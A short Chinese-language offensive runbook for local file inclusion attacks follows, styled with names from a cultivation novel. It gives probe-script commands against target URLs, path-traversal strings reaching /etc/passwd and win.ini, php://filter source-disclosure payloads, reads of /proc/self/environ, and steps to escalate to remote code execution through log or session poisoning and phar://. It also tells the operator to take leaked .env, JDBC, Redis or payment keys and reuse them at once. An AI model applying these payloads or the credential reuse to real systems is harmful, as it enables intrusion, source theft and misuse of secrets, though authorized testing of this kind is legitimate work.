# 大爱仙尊 LFI 作业手法

> 杀招：`开卷`  
> 工具：`python3 炼蛊房/tpl_inject_probe.py lfi`  
> Vite `@fs`：走 `vite-fs-read`，不要当通用 LFI

目标须在 scope。读到 `.env` / 支付钥立刻回灌假支付，不要只报 passwd。

---

## 1. 立刻跑

```bash
python3 炼蛊房/tpl_inject_probe.py lfi --url 'https://授权/?file=1' --param file --case <案>
python3 炼蛊房/core_web_surface_probe.py -u https://授权站 --case <案>
```

产物：`案卷/tpl_inject/lfi.json`。

---

## 2. 四刀

1. **穿越** — `../../../../etc/passwd`、`....//`、Windows `win.ini`  
2. **伪协议** — `php://filter/convert.base64-encode/resource=index.php`（正文出现 `PD9waH`）  
3. **包装** — `/proc/self/environ`、日志、session 文件  
4. **升 RCE** — 日志投毒 / session 投毒 / 上传后 `phar://`；授权内直接做

RFI 要 `allow_url_include`。没有远程包含就别硬打 http wrapper。

---

## 3. 档位

| 档 | 成立 |
|----|------|
| L1 | 路径被拼进 include/read |
| L2 | passwd / win.ini / PHP 源码 base64 |
| L3 | 包含可控文件后命令执行 |

`.env` / JDBC / Redis → 假支付或中间件卡。Nginx alias 穿越走 `nginx-misconfig`。
